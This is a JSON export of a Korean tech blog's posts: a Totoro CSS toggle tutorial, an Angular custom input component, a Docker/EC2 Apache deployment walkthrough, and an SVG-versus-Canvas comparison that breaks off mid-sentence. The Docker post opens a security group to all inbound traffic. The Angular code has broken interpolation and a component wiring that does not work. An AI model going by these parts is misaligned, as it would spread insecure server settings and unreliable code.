{"pageProps":{"posts":[{"title":"HTML과 CSS를 사용하여 토토로 토글 스위치 만들기","description":"","date":"2024-05-02 00:19","slug":"2024-05-02-BuildingaTotoroToggleSwitchUsingHTMLandCSS","content":"\n\n![이미지](https://miro.medium.com/v2/resize:fit:1200/1*iYFn9d8WYGm9cfRXBZVzLg.gif)\n\n웹 프로젝트에 재미를 더해볼 준비가 되셨나요? 오늘의 #100DaysOfCode 챌린지에서는 HTML과 CSS를 사용하여 토토로 토글 스위치를 만들어보려고 해요.\n\n이 즐거운 상호 작용 프로젝트는 여러분의 코딩 스킬을 향상시킬 뿐만 아니라 여러분에게 웃음을 선사할 거에요! 함께 단계별로 알아보도록 할게요.\n\n# 단계 1: 환경 설정하기\n\n<div class=\"content-ad\"></div>\n\n시작하기 전에 텍스트 편집기를 준비해주세요. 원하는 에디터를 사용할 수 있어요. 인기 있는 선택지로는 Visual Studio Code, Sublime Text, 또는 Atom이 있어요. 프로젝트를 위한 폴더도 만들어봅시다.\n\n## 단계 2: 소스 코드 다운로드\n\n프로젝트의 전체 소스 코드를 여기서 다운로드할 수 있어요.\n\n## 단계 3: HTML 구조 만들기\n\n<div class=\"content-ad\"></div>\n\n텍스트 에디터를 열고 새 HTML 파일을 만들어보세요. 파일 이름을 index.html로 지정해 볼까요? 기본 HTML 구조를 설정하는 것부터 시작해봅시다.\n\n```html\n<!DOCTYPE html>\n<html lang=\"en\">\n\n<head>\n    <!-- 문자 인코딩 및 호환성 설정 -->\n    <meta charset=\"UTF-8\">\n    <meta http-equiv=\"X-UA-Compatible\" content=\"IE=edge\">\n    <meta name=\"viewport\" content=\"width=device-width, initial-scale=1.0\">\n    <!-- 외부 스타일시트 링크 -->\n    <link rel=\"stylesheet\" href=\"style.css\">\n    <!-- 문서 제목 -->\n    <title>Totro 토글 스위치</title>\n</head>\n\n<body>\n    <!-- 토글 스위치를 위한 래퍼 -->\n    <div class='wrap'>\n        <!-- 토글로 사용되는 체크박스 입력 -->\n        <input type='checkbox'>\n        <!-- 토토로 캐릭터 컨테이너 -->\n        <div class='totoro'>\n            <!-- 토토로의 귀 -->\n            <div class='ears'>\n                <div class='ear'></div>\n                <div class='ear'></div>\n            </div>\n            <!-- 토토로의 팔 -->\n            <div class='arm'></div>\n            <div class='arm'></div>\n            <!-- 토토로의 발 -->\n            <div class='foot'></div>\n            <div class='foot two'></div>\n            <!-- 토토로의 몸통 -->\n            <div class='body'>\n                <!-- 토토로 몸통의 반점 -->\n                <div class='spots'>\n                    <div class='spot'></div>\n                    <div class='spot'></div>\n                    <div class='spot'></div>\n                    <div class='spot'></div>\n                    <div class='spot'></div>\n                    <div class='spot'></div>\n                    <div class='spot'></div>\n                </div>\n                <!-- 토토로의 얼굴 특징 -->\n                <div class='inner'>\n                    <div class='mouth'></div>\n                    <div class='eye'></div>\n                    <div class='eye'></div>\n                </div>\n            </div>\n        </div>\n    </div>\n</body>\n\n</html>\n```\n\n# Step 4: 토토로의 CSS 스타일링 추가하기\n\n이제 CSS 스타일링을 추가하여 토토로 캐릭터를 활기차게 만들어봅시다. style.css라는 새 CSS 파일을 만들고 HTML 파일에 링크를 걸어주세요.\n\n<div class=\"content-ad\"></div>\n\n```js\n/* 본문 스타일링 */\nbody {\n    display: flex;\n    justify-content: center;\n    align-items: center;\n    height: 100vh;\n    perspective: 600px;\n    background: radial-gradient(circle at center, #cfe4a1, #8eb735);\n    overflow: hidden;\n}\n\n/* 모든 요소에 대해 3D 변환 유지 */\nbody * {\n    transform-style: preserve-3d;\n}\n\n/* 토로 스위치 래퍼 */\nbody .wrap {\n    width: 275px;\n    height: 100px;\n    position: relative;\n    box-shadow: 0 0 0 2px #eee, 0 0 40px 0px rgba(0, 0, 0, 0.15);\n    border-radius: 500px;\n    background: #fff;\n}\n\n/* 래퍼 내 모든 요소에 전환 적용 */\nbody .wrap * {\n    transition: 0.25s linear;\n}\n\n/* 토로 캐릭터 스타일링 */\nbody .wrap .totoro {\n    position: absolute;\n    width: 100px;\n    height: 150px;\n    left: 0px;\n    top: -30px;\n    background: #bbb;\n    border-radius: 170px 170px 100px 100px/300px 300px 200px 200px;\n    z-index: 2;\n}\n\nbody .wrap .totoro:before,\nbody .wrap .totoro:after {\n    content: \"\";\n    position: absolute;\n    width: 300vw;\n    height: 300vh;\n    left: -100vw;\n    top: -100vh;\n    background: rgba(6, 61, 109, 0.75);\n    z-index: -1;\n    transform: translateZ(-10px);\n    opacity: 0;\n    transition: 0.5s ease-in-out;\n    pointer-events: none;\n}\n\n// 이하 생략\n```\n\n### 단계 5: 사용자 정의 및 테스트\n\nCSS 코드를 조정하여 토토로 캐릭터의 모양과 애니메이션을 자유롭게 사용자 정의하세요. 만족하시면 파일을 저장하고 웹 브라우저에서 index.html을 열어 토글 스위치를 테스트하세요.\n\n### 단계 6: 프로젝트 공유!\n\n<div class=\"content-ad\"></div>\n\n토토로 토글 스위치를 만들어 축하드려요! #100DaysOfCode 해시태그를 사용해 소셜 미디어에 프로젝트를 공유하고 코딩 여정을 자랑해주세요. 제 프로젝트에 태그를 달고 의견을 알려주시면 감사하겠어요!\n\n# 단계 7: 연락하기\n\n이 프로젝트에 관한 질문이나 피드백이 있다면 언제든지 Bento를 통해 연락해 주세요. 여러분의 의견을 듣고 싶어요!\n\n행복한 코딩을 하시고 여러분의 코딩 여정을 멋지게 이어가세요! 🚀✨","ogImage":{"url":"/assets/img/2024-05-02-BuildingaTotoroToggleSwitchUsingHTMLandCSS_0.png"},"coverImage":"/assets/img/2024-05-02-BuildingaTotoroToggleSwitchUsingHTMLandCSS_0.png","tag":["Tech"],"readingTime":5},{"title":"Angular에서 폼 유효성을 갖춘 인풋 요소 만들기","description":"","date":"2024-05-02 00:18","slug":"2024-05-02-BuildingaCustomInputComponentwithFormValidationinAngular","content":"\n\n<img src=\"/assets/img/2024-05-02-BuildingaCustomInputComponentwithFormValidationinAngular_0.png\" />\n\n현대 웹 개발에서 재사용 가능하고 유효성이 검증된 폼 컴포넌트를 만드는 것은 매우 중요합니다. Angular를 탐험하는 이 과정에서 여러 입력 유형을 처리하고 Angular 애플리케이션 내에서 신속하게 폼 유효성을 검증하는 다목적 Custom Input Component를 만들었습니다.\n\n# 1. Angular 프로젝트 설정하기:\n\n새로운 Angular 프로젝트 생성하기:\n\n<div class=\"content-ad\"></div>\n\n```js\nng new custom-input-project\n```\n\n커스텀 입력 컴포넌트 생성:\n\n```js\nng generate component custom-input\n```\n\n## 디렉토리 구조:\n\n<div class=\"content-ad\"></div>\n\n```js\n사용자 정의 입력 프로젝트/\n├── src/\n│ ├── app/\n│ │ ├── custom-input/\n│ │ │ ├── custom-input.component.html\n│ │ │ ├── custom-input.component.css\n│ │ │ ├── custom-input.component.spec.ts\n│ │ │ └── custom-input.component.ts\n│ │ ├── app.component.html\n│ │ ├── app.component.css\n│ │ ├── app.component.spec.ts\n│ │ └── app.component.ts\n│ │ ├── app.module.ts\n│ │ └── …\n│ └── …\n└── …\n```\n\n# 2. 커스텀 입력 컴포넌트 생성하기:\n\nCustomInputComponent는 입력 필드를 캡슐화하고 다양한 입력 유형을 처리하며 Angular의 FormControl 및 Validators를 사용하여 기본 양식 유효성을 구현할 것입니다.\n\n## 컴포넌트 구조(custom-input.component.ts):\n\n<div class=\"content-ad\"></div>\n\nThe CustomInputComponent TypeScript file (custom-input.component.ts):\n\n```js\nimport { Component, Input, Output, EventEmitter } from '@angular/core';\nimport { FormControl, Validators } from '@angular/forms';\n\n@Component({\n  selector: 'app-custom-input',\n  templateUrl: './custom-input.component.html',\n  styleUrls: ['./custom-input.component.css']\n})\nexport class CustomInputComponent {\n  @Input() label: string = '';\n  @Input() type: string = 'text';\n  @Output() valueChange = new EventEmitter<string>();\n\n  control: FormControl = new FormControl('', Validators.required);\n\n  get value(): string {\n    return this.control.value;\n  }\n\n  set value(val: string) {\n    this.control.setValue(val);\n    this.valueChange.emit(val);\n  }\n}\n```\n\nComponent Template (custom-input.component.html):\n\nThe CustomInputComponent HTML template (custom-input.component.html):\n\n<div class=\"content-ad\"></div>\n\n```js\n<div class=\"form-group\">\n  <label>{ label }</label>\n  <input\n    [type]=\"type\"\n    class=\"form-control\"\n    [formControl]=\"control\"\n    [attr.placeholder]=\"label\"\n  />\n  <div *ngIf=\"control.invalid && control.touched\" class=\"text-danger\">\n    This field is required.\n  </div>\n</div>\n```\n\n## 설명:\n\n- CustomInputComponent TypeScript 파일은 컴포넌트의 논리를 정의합니다.\n- @Input을 사용하여 label 및 type 속성을 받아들이고, @Output을 사용하여 값 변경을 발생시킵니다.\n- FormControl은 기본 유효성 검사를 포함한 폼 처리에 활용됩니다 (이 경우, 필수 필드).\n- 템플릿은 입력 필드를 렌더링하고 필수 필드에 대한 유효성 검사 메시지를 표시합니다.\n- 컴포넌트 스타일은 UI 조정에 필요한 대로 사용자 정의할 수 있습니다.\n\n# 3. 폼에서 사용자 정의 입력 구현하기:```\n\n<div class=\"content-ad\"></div>\n\n사용자 지정 입력 구성 요소를 반응형 양식 내에서 통합하는 것은 Angular 양식 환경 내에서의 기능을 보여줍니다.\n\n컴포넌트의 상위 (app.component.ts):\n\n```js\nimport { Component, OnInit } from '@angular/core';\nimport { FormBuilder, FormGroup, Validators } from '@angular/forms';\n\n@Component({\n  selector: 'app-root',\n  templateUrl: './app.component.html',\n  styleUrls: ['./app.component.css'],\n})\nexport class AppComponent implements OnInit {\n  form: FormGroup;\n\n  constructor(private fb: FormBuilder) {}\n\n  ngOnInit() {\n    this.form = this.fb.group({\n      name: ['', Validators.required],\n    });\n  }\n}\n```\n\n상위 컴포넌트의 템플릿 (app.component.html):\n\n<div class=\"content-ad\"></div>\n\n```js\n<form [formGroup]=\"form\">\n  <app-custom-input\n    label=\"이름 입력\"\n    [type]=\"'text'\"\n    formControlName=\"name\"\n  ></app-custom-input>\n</form>\n```\n\n## 설명:\n\n- AppComponent는 FormBuilder를 사용하여 form group 및 input 필드에 대한 form control을 생성합니다.\n- 상위 컴포넌트 템플릿(app.component.html)에서 CustomInputComponent가 form 내부에서 사용되고 formControlName을 사용하여 form control에 바인딩됩니다.\n- label 및 input type은 CustomInputComponent의 @Input 속성으로 지정됩니다.\n- CustomInputComponent 내의 input 필드는 이제 Angular 반응형 폼 내에서 작동하며 유효성 검증을 위해 form control 속성을 활용합니다.\n\n# 4. Custom Input Component 테스트하기:\n\n<div class=\"content-ad\"></div>\n\n사용자 지정 입력 구성 요소의 유효성 및 기능을 서로 다른 입력 유형 및 유효성 검사 시나리오에 걸쳐 검증하고 테스트하는 것이 중요합니다.\n\n구성 요소 테스트 (custom-input.component.spec.ts):\n\n```js\nimport { ComponentFixture, TestBed } from '@angular/core/testing';\nimport { ReactiveFormsModule, FormGroup, FormBuilder } from '@angular/forms';\nimport { CustomInputComponent } from './custom-input.component';\n\ndescribe('CustomInputComponent', () => {\n  let component: CustomInputComponent;\n  let fixture: ComponentFixture<CustomInputComponent>;\n  let formBuilder: FormBuilder;\n\n  beforeEach(async () => {\n    await TestBed.configureTestingModule({\n      declarations: [CustomInputComponent],\n      imports: [ReactiveFormsModule],\n    }).compileComponents();\n  });\n\n  beforeEach(() => {\n    fixture = TestBed.createComponent(CustomInputComponent);\n    component = fixture.componentInstance;\n    formBuilder = TestBed.inject(FormBuilder);\n    fixture.detectChanges();\n  });\n\n  it('should create the component', () => {\n    expect(component).toBeTruthy();\n  });\n\n  it('should display the input field', () => {\n    const compiled = fixture.nativeElement;\n    expect(compiled.querySelector('input')).toBeTruthy();\n  });\n\n  it('should validate required field', () => {\n    const control = formBuilder.control('', { required: true });\n    const form = formBuilder.group({ testInput: control });\n\n    component.control = control;\n    fixture.detectChanges();\n\n    expect(form.valid).toBeFalsy();\n\n    const input = fixture.nativeElement.querySelector('input');\n    input.value = 'Test Value';\n    input.dispatchEvent(new Event('input'));\n\n    fixture.detectChanges();\n    expect(form.valid).toBeTruthy();\n  });\n\n  it('should render the label', () => {\n    component.label = 'Test Label';\n    fixture.detectChanges();\n\n    const compiled = fixture.nativeElement;\n    expect(compiled.querySelector('label').textContent).toContain('Test Label');\n  });\n\n  // 다양한 입력 유형, 유효성 검사 및 동작에 대한 더 구체적인 테스트 추가\n});\n```\n\n## 설명:\n\n<div class=\"content-ad\"></div>\n\n- CustomInputComponent의 테스트 스위트에는 입력 컴포넌트의 다양한 측면을 검증하는 여러 테스트가 포함되어 있습니다.\n- 첫 번째 테스트는 CustomInputComponent의 성공적인 생성을 확인합니다.\n- 두 번째 테스트는 입력 필드가 컴포넌트 내에 표시되는지 확인합니다.\n- 세 번째 테스트는 필수 필드 기능을 확인합니다. 폼 컨트롤을 생성하고 컴포넌트에 할당하며 사용자 입력을 시뮬레이트하여 필드의 유효성을 확인합니다.\n- 네 번째 테스트는 컴포넌트 내에 레이블이 렌더링되는지 확인합니다.\n\n# 결론:\n\nAngular의 기능을 통해 유연성과 신뢰성에 뛰어난 Custom Input Component를 구축했습니다. 시작부터 철저한 테스트까지, Angular 애플리케이션 내에서 폼 상호 작용을 증진시키는 재사용 가능한 컴포넌트를 만드는 과정을 탐험했습니다. 이 여정은 다양하고 검증된 입력 필드를 통해 사용자 중심 경험을 만드는 길을 열어줍니다.","ogImage":{"url":"/assets/img/2024-05-02-BuildingaCustomInputComponentwithFormValidationinAngular_0.png"},"coverImage":"/assets/img/2024-05-02-BuildingaCustomInputComponentwithFormValidationinAngular_0.png","tag":["Tech"],"readingTime":7},{"title":"프로덕션 환경에서 Docker를 사용하여 HTML 웹사이트를 컨테이너화하는 방법","description":"","date":"2024-05-02 00:16","slug":"2024-05-02-ContainerizedanHTMLWebsiteusingDockeronProductionEnvironmentDockerCaseStudy","content":"\n\n안녕하세요! \n프로덕션 서버에 있는 애플리케이션을 Dockerize해야 하는 주요 소프트웨어 회사의 데브옵스 엔지니어로 일하고 계시군요. 회사는 커스텀 소프트웨어를 사용하기 때문에 미리 빌드된 컨테이너를 사용할 수 없습니다.\n\n다음 링크를 사용해주세요: https://github.com/microsoft/project-html-website.git\n\n다음 내용을 가정해주세요:\n\n<div class=\"content-ad\"></div>\n\n1. 소프트웨어가 설치된 상태로 Apache를 가정합니다.\n\n2. Ubuntu 컨테이너를 사용하십시오.\n\n회사는 다음을 원합니다:\n\n1. 개발자들은 도커를 사용하지 않을 것이기 때문에, 그들로부터 코드를 받게 될 것입니다. 빌드한 사용자 정의 이미지에 코드를 넣을 수 있는 Docker 파일을 작성해주세요.\n\n<div class=\"content-ad\"></div>\n\n2. 위의 구성으로 Docker Hub에 이미지를 푸시하세요.\n\n![이미지](/assets/img/2024-05-02-ContainerizedanHTMLWebsiteusingDockeronProductionEnvironmentDockerCaseStudy_0.png)\n\n이 케이스 스터디를 위한 명령어를 복사할 수 있는 GitHub 저장소 링크\n\n# 1. 우분투 머신을 사용하여 새로운 인스턴스 생성\n\n<div class=\"content-ad\"></div>\n\n단계 1: 먼저 인스턴스를 시작하겠습니다. “인스턴스 시작”을 클릭하세요.\n\n![Step 1](/assets/img/2024-05-02-ContainerizedanHTMLWebsiteusingDockeronProductionEnvironmentDockerCaseStudy_1.png)\n\n단계 2: “이름”을 “사례 연구”로 선택하세요.\n\n![Step 2](/assets/img/2024-05-02-ContainerizedanHTMLWebsiteusingDockeronProductionEnvironmentDockerCaseStudy_2.png)\n\n<div class=\"content-ad\"></div>\n\nStep 3: \"AMI\"를 \"Ubuntu\"로 선택하세요.\n\n![이미지](/assets/img/2024-05-02-ContainerizedanHTMLWebsiteusingDockeronProductionEnvironmentDockerCaseStudy_3.png)\n\nStep 4: \"인스턴스 유형\"을 \"t2.micro\"로 유지하고 \"키페어(로그인)\"를 \"키페어 없이 진행\"으로 선택하세요.\n\n![이미지](/assets/img/2024-05-02-ContainerizedanHTMLWebsiteusingDockeronProductionEnvironmentDockerCaseStudy_4.png)\n\n<div class=\"content-ad\"></div>\n\n스텝 5: \"네트워크 설정\"에서 \"편집\"을 클릭하세요.\n\n<img src=\"/assets/img/2024-05-02-ContainerizedanHTMLWebsiteusingDockeronProductionEnvironmentDockerCaseStudy_5.png\" />\n\n스텝 6: 여기에서 다음 옵션을 선택하세요:\n\na. 먼저, 여기에서 \"보안 그룹 생성\"을 선택하세요.\n\n<div class=\"content-ad\"></div>\n\nb. 보안 그룹 이름 - 필수: 사례 연구\n\nc. 설명: 사례 연구용 보안 그룹\n\n보안 그룹 규칙 2에서 \"소스 유형\"을 \"아무 곳에서나(Anywhere)\"로 선택하고 \"모든 트래픽(All Traffic)\"을 선택하세요.\n\n![이미지](/assets/img/2024-05-02-ContainerizedanHTMLWebsiteusingDockeronProductionEnvironmentDockerCaseStudy_6.png)\n\n<div class=\"content-ad\"></div>\n\n\n![이미지](/assets/img/2024-05-02-ContainerizedanHTMLWebsiteusingDockeronProductionEnvironmentDockerCaseStudy_7.png)\n\n단계 7: \"인스턴스 시작\"을 클릭합니다.\n\n![이미지](/assets/img/2024-05-02-ContainerizedanHTMLWebsiteusingDockeronProductionEnvironmentDockerCaseStudy_8.png)\n\n단계 8: \"하이퍼링크\"를 클릭하여 \"인스턴스\"를 확인하세요.\n\n<div class=\"content-ad\"></div>\n\n![이미지](/assets/img/2024-05-02-ContainerizedanHTMLWebsiteusingDockeronProductionEnvironmentDockerCaseStudy_9.png)\n\n단계 9: \"인스턴스\"를 클릭하세요. 인스턴스를 선택하고 \"연결\"을 클릭하세요.\n\n![이미지](/assets/img/2024-05-02-ContainerizedanHTMLWebsiteusingDockeronProductionEnvironmentDockerCaseStudy_10.png)\n\n단계 10: \"EC2 Instance Connect\"에서 \"연결\"을 클릭하세요.\n\n<div class=\"content-ad\"></div>\n\n<img src=\"/assets/img/2024-05-02-ContainerizedanHTMLWebsiteusingDockeronProductionEnvironmentDockerCaseStudy_11.png\" />\n\n11단계: \"Ubuntu Machine\"이 작동 준비가 되었어요.\n\n<img src=\"/assets/img/2024-05-02-ContainerizedanHTMLWebsiteusingDockeronProductionEnvironmentDockerCaseStudy_12.png\" />\n\n## 2. Ubuntu Machine 업데이트 및 Docker 설치\n\n<div class=\"content-ad\"></div>\n\n스텝 1: 머신을 업데이트하려면 이 명령을 실행하세요:\n\n```js\nsudo apt update\n```\n\n![이미지](/assets/img/2024-05-02-ContainerizedanHTMLWebsiteusingDockeronProductionEnvironmentDockerCaseStudy_13.png)\n\n스텝 2: 다음 명령을 사용하여 Docker를 설치하세요:\n\n<div class=\"content-ad\"></div>\n\n```js\nsudo apt-get install docker.io –y\n```\n\n![이미지](/assets/img/2024-05-02-ContainerizedanHTMLWebsiteusingDockeronProductionEnvironmentDockerCaseStudy_14.png)\n\n단계 3: 다음 명령어를 사용하여 도커를 시작하고 활성화합니다:\n\n```js\nsudo systemctl enable docker\nsudo systemctl start docker\n```\n\n<div class=\"content-ad\"></div>\n\n![이미지](/assets/img/2024-05-02-ContainerizedanHTMLWebsiteusingDockeronProductionEnvironmentDockerCaseStudy_15.png)\n\n단계 4: Docker의 상태를 확인하려면 다음 명령어를 입력하세요:\n\n```js\nsudo systemctl status docker\n```\n\n![이미지](/assets/img/2024-05-02-ContainerizedanHTMLWebsiteusingDockeronProductionEnvironmentDockerCaseStudy_16.png)\n\n<div class=\"content-ad\"></div>\n\n5단계: \"sudo su -\" 명령을 사용하여 \"루트 사용자\"로 로그인하세요. 그리고, 사용 중인 도커의 현재 버전을 확인하기 위해 \"docker --version\"을 입력하세요.\n\n```js\nsudo su -\ndocker --version\n```\n\n<img src=\"/assets/img/2024-05-02-ContainerizedanHTMLWebsiteusingDockeronProductionEnvironmentDockerCaseStudy_17.png\" />\n\n# 3. 새 폴더를 만들고 Github 저장소를 복제하세요.\n\n<div class=\"content-ad\"></div>\n\n1단계: \"mkdir w1\" 명령어를 사용하여 \"w1\" 디렉토리를 생성하고 디렉토리를 확인하기 위해 \"ls\" 명령어를 입력합니다.\n\n```sh\nmkdir w1\n```\n\n<img src=\"/assets/img/2024-05-02-ContainerizedanHTMLWebsiteusingDockeronProductionEnvironmentDockerCaseStudy_18.png\" />\n\n2단계: 아래 명령어를 사용하여 \"w1\" 디렉토리로 들어갑니다.\n\n<div class=\"content-ad\"></div>\n\n```js\ncd w1\n```\n\n![이미지](/assets/img/2024-05-02-ContainerizedanHTMLWebsiteusingDockeronProductionEnvironmentDockerCaseStudy_19.png)\n\n3단계: “project-HTML-website” 디렉토리를 \"Git Hub\"에서 연 다음, “Code”를 클릭하고 여기서 제공된 URL을 복사해주세요.\n\n```js\nhttps://github.com/microsoft/project-html-website.git\n```\n\n<div class=\"content-ad\"></div>\n\n<img src=\"/assets/img/2024-05-02-ContainerizedanHTMLWebsiteusingDockeronProductionEnvironmentDockerCaseStudy_20.png\" />\n\nStep 4: \"w1\" 디렉토리에서 이 “html website” 저장소를 다운로드하려면 다음 명령을 입력하세요:\n\n```js\ngit clone https://github.com/microsoft/project-html-website.git\n```\n\n<img src=\"/assets/img/2024-05-02-ContainerizedanHTMLWebsiteusingDockeronProductionEnvironmentDockerCaseStudy_21.png\" />\n\n<div class=\"content-ad\"></div>\n\n스텝 5: \"ls\" 및 \"project-html-website\"가 성공적으로 다운로드되었는지 확인하세요.\n\n```js\nls\n```\n\n<img src=\"/assets/img/2024-05-02-ContainerizedanHTMLWebsiteusingDockeronProductionEnvironmentDockerCaseStudy_22.png\" />\n\n스텝 6: \"cd project-html-website\"를 입력하여 해당 리포지토리 내부로 이동하세요. \"project-html-website\" 폴더 내부로 이동하게 됩니다.\n\n<div class=\"content-ad\"></div>\n\n```js\ncd project-html-website\n```\n\n<img src=\"/assets/img/2024-05-02-ContainerizedanHTMLWebsiteusingDockeronProductionEnvironmentDockerCaseStudy_23.png\" />\n\n# Problem 1 Solution: 개발자들은 Docker를 사용하지 않을 것이기 때문에, 그들이 제공하는 코드를 받을 거에요. 당신이 만든 사용자 정의 이미지에 코드를 넣을 수 있는 Docker 파일을 작성해주세요.\n\n단계 1: 먼저, 다음 명령을 사용하여 Docker 파일을 생성하세요:```\n\n<div class=\"content-ad\"></div>\n\n```js\nvim Dockerfile\n```\n\n<img src=\"/assets/img/2024-05-02-ContainerizedanHTMLWebsiteusingDockeronProductionEnvironmentDockerCaseStudy_24.png\" />\n\n단계 2: Docker 파일 내에 이 코드를 넣으세요:\n\n```js\nFROM ubuntu\nRUN apt-get update\nRUN apt-get install apache2 -y\nRUN apt-get install apache2-utils -y\nRUN apt-get clean\nENTRYPOINT apache2ctl -D FOREGROUND\nADD index.html /var/www/html/\n```\n\n<div class=\"content-ad\"></div>\n\n<img src=\"/assets/img/2024-05-02-ContainerizedanHTMLWebsiteusingDockeronProductionEnvironmentDockerCaseStudy_25.png\" />\n\n키보드에서 \"ESC\"를 누르고 \" :wq!\"을 입력하여 파일을 종료 및 저장하세요.\n\n3단계: 이 명령을 사용하여 이미지를 생성하세요.\n\n```js\nsudo docker build –t myimg .\n```\n\n<div class=\"content-ad\"></div>\n\n<img src=\"/assets/img/2024-05-02-ContainerizedanHTMLWebsiteusingDockeronProductionEnvironmentDockerCaseStudy_26.png\" />\n\n단계 4: 이제 다음 명령을 사용하여 컨테이너를 만들어보세요:\n\n```js\ndocker container run –itd -p 88:80 –name test076 myimg\n```\n\n컨테이너가 활성화되었는지 확인하려면 \"docker ps -a\"를 실행하세요.\n\n<div class=\"content-ad\"></div>\n\n```js\n도커 ps -a\n```\n\n우리는 포트 88에서 컨테이너를 생성했습니다.\n\n![이미지](/assets/img/2024-05-02-ContainerizedanHTMLWebsiteusingDockeronProductionEnvironmentDockerCaseStudy_27.png)\n\n단계 5: IP 주소를 복사하여 새 브라우저 주소 창에 붙여넣으십시오. http://35.154.146.28:88/\n\n<div class=\"content-ad\"></div>\n\n<img src=\"/assets/img/2024-05-02-ContainerizedanHTMLWebsiteusingDockeronProductionEnvironmentDockerCaseStudy_28.png\" />\n\n당신의 웹사이트가 성공적으로 88번 포트를 통해 배포되었습니다.\n\n# 문제 2 해결책: 위 구성을 사용하여 Docker-Hub에 이미지를 푸시하세요.\n\n단계 1: Docker Hub로 푸시할 이미지에 태그를 지정하세요. 다음 명령어를 사용하세요:\n\n<div class=\"content-ad\"></div>\n\n```js\nsudo docker tag myimg visaltyagi12/myimg\n```\n\n![Image](/assets/img/2024-05-02-ContainerizedanHTMLWebsiteusingDockeronProductionEnvironmentDockerCaseStudy_29.png)\n\n이미지의 이름을 visaltyagi12/myimg으로 성공적으로 만들었습니다.\n\n단계 2: 첫 번째로 사용자 이름과 암호를 사용하여 다음 명령을 사용하여 도커에 로그인하십시오: sudo docker login. 로그인이 성공적으로 완료됩니다.\n\n<div class=\"content-ad\"></div>\n\n```js\nsudo docker login\n```\n\n![Image](/assets/img/2024-05-02-ContainerizedanHTMLWebsiteusingDockeronProductionEnvironmentDockerCaseStudy_30.png)\n\n단계 3: 이미지를 푸시하려면 이 명령을 사용하세요:\n\n```js\nsudo docker push visaltyagi12/myimg\n```\n\n<div class=\"content-ad\"></div>\n\n<img src=\"/assets/img/2024-05-02-ContainerizedanHTMLWebsiteusingDockeronProductionEnvironmentDockerCaseStudy_31.png\" />\n\n제4단계: 도커 허브 계정에 로그인하고 \"저장소\" 섹션으로 이동합니다. 모든 이미지가 여기에 표시됩니다.\n\n<img src=\"/assets/img/2024-05-02-ContainerizedanHTMLWebsiteusingDockeronProductionEnvironmentDockerCaseStudy_32.png\" />\n\n## 더 많은 도커 과제\n\n<div class=\"content-ad\"></div>\n\n우분투에 컨테이너를 생성하고 Apache2를 설치하세요 — 도커 과제 1\n\n새 이미지를 사용하여 컨테이너를 시작하고 여기에 Apache 2 서비스를 시작하세요 — 도커 과제 2\n\n도커 허브에서 이미지를 가져오고 별도의 머신에 Apache2를 설치하세요 — 도커 과제 3\n\n컨테이너 실행 후 자동으로 Apache2를 설치하는 Docker 파일을 만드세요 — 도커 과제 4\n\n<div class=\"content-ad\"></div>\n\n아파치 기본 웹 페이지를 샘플 HTML 파일 안에 포함된 컨테이너로 교체하기 — 도커 과제 5\n\n## 테라폼 사례 연구는 여기를 확인하세요\n\nAWS에서 테라폼을 사용하여 아키텍처 생성하기 — 테라폼 사례 연구","ogImage":{"url":"/assets/img/2024-05-02-ContainerizedanHTMLWebsiteusingDockeronProductionEnvironmentDockerCaseStudy_0.png"},"coverImage":"/assets/img/2024-05-02-ContainerizedanHTMLWebsiteusingDockeronProductionEnvironmentDockerCaseStudy_0.png","tag":["Tech"],"readingTime":9},{"title":"개발자가 알아둬야할 SVG와 캔버스 비교 정리","description":"","date":"2024-05-02 00:10","slug":"2024-05-02-SVGVsCanvasAComparison","content":"\n\n\n![SVG vs Canvas](/assets/img/2024-05-02-SVGVsCanvasAComparison_0.png)\n\n웹 그래픽 및 이미지를 표시하는 데 가장 널리 사용되는 두 가지 기술은 SVG와 Canvas입니다. 이 둘 모두 매력적인 웹 경험을 만들기 위한 웹 표준입니다. SVG는 해상도에 독립적이며 모양, 선 및 텍스트로 구성되어 있어 화질을 잃지 않고 확대 또는 축소할 수 있습니다. SVG 그래픽 및 이미지는 상호작용, 데이터 주도형 및 맞춤형 애플리케이션에 이상적입니다. 반면에 비트맵은 해상도 의존적인 래스터 그래픽 API인 Canvas에 이미지 데이터를 저장하는 데 사용됩니다. 웹 페이지에 모양과 이미지를 그리는 것은 흔한 실천법이며, 상호작용 게임, 애니메이션 및 시각화를 만들기 쉽습니다.\n\n# SVG와 Canvas란 무엇인가요?\n\n대부분의 최신 브라우저는 XML 기반의 벡터 그래픽 형식인 SVG를 지원합니다. 픽셀화 없이 크기를 조절할 수 있는 간단한 그래픽 및 다이어그램을 만드는 데 효과적입니다. 또한 JavaScript를 사용하여 SVG를 통해 상호작용 그래픽을 생성할 수 있습니다. SVG는 XML 표준에 의존하는 2차원 벡터 이미지 형식입니다. 웹 디자인 및 개발에서 로고, 다이어그램 및 아이콘과 같은 벡터 그래픽을 만들거나 관리하기 위해 자주 사용됩니다. 기존의 JPEG, PNG 및 GIF와 같은 래스터 이미지와는 달리 SVG 이미지는 화질을 희생하지 않고 비율을 변경할 수 있어 웹사이트와 다양한 해상도를 가진 기기에서 이미지를 표시하는 데 더 나은 선택입니다. 또한 SVG 이미지는 압축되어 있어 래스터 이미지보다 빠르게 로드됩니다.\n\n<div class=\"content-ad\"></div>\n\nCanvas는 웹을 위한 동적 대화형 그래픽을 만들 수 있게 해주는 HTML5 기능입니다. 래스터 기반인 Canvas는 더 복잡한 시각화와 애니메이션을 생성하기에 적합하기 때문에 데이터 시각화와 같은 작업에 가장 적합합니다. 그러나 SVG와는 달리 Canvas는 픽셀 기반 형식이기 때문에 이미지를 Canvas에 너무 많이 확대하면 픽셀화될 수 있습니다. Canvas는 해상도에 따라 동적으로 그래픽, 게임 그래픽 및 다른 시각적 요소를 표시하는 비트맵 캔버스를 제공합니다. JavaScript를 사용하여 웹사이트에 직접 그래픽을 그릴 수 있습니다. Canvas 요소는 단지 그래픽을 보관하는 공간에 불과합니다.\n\nSVG와 Canvas의 주요 차이점은 SVG가 벡터 기반 이미지 형식을 사용한다는 점이며, Canvas는 래스터 기반 이미지 형식을 사용한다는 것입니다. SVG 이미지를 구성하는 선, 곡선 및 모양인 Path는 수학적 방정식을 사용하여 생성됩니다. 이로 인해 이러한 요소들은 쉽게 조작하고 무한히 확대할 수 있습니다. 반면에 Canvas 이미지는 픽셀로 구성되어 있으며, 이미지를 만들기 위해 서로 옆에 배열된 작은 색깔의 정사각형입니다. Canvas 이미지는 해상도에 따라 의존하기 때문에 확대되면 픽셀화되어 흐릿해집니다.\n\n# SVG와 Canvas 사용의 제약사항\n\nSVG 및 Canvas는 모두 대화형 그래픽을 생성하는 강력한 도구지만, 사용할 때 고려해야 할 몇 가지 제한 사항이 